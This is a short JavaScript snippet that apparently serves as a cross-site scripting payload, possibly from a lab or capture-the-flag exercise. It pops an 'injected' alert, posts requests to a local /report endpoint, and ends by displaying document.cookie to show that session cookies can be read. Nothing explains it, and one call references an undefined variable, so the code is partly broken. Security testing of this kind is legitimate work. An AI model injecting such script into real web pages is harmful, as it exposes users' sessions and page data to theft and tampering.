alert("injected");

fetch("http://localhost/report", {
  method: "POST",
  body: new URLSearchParams({
    'id': '0'
  }),
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  }
})
.then(response => {
  if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
  }
  return response.text();
})
.then(html => {
  console.log(html); // Log the HTML code of the page
})
.catch(error => {
  console.error('Fetch Error:', error);
});

const requestInterceptor = new XMLHttpRequest();
requestInterceptor.open('POST', '/report', true);
requestInterceptor.setRequestHeader('Content-Type', 'application/json');
requestInterceptor.onreadystatechange = function() {
  if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
    console.log('Intercepted Request Body:', JSON.parse(this.responseText));
  }
};
requestInterceptor.send(JSON.stringify(requestBody));

alert(document.cookie);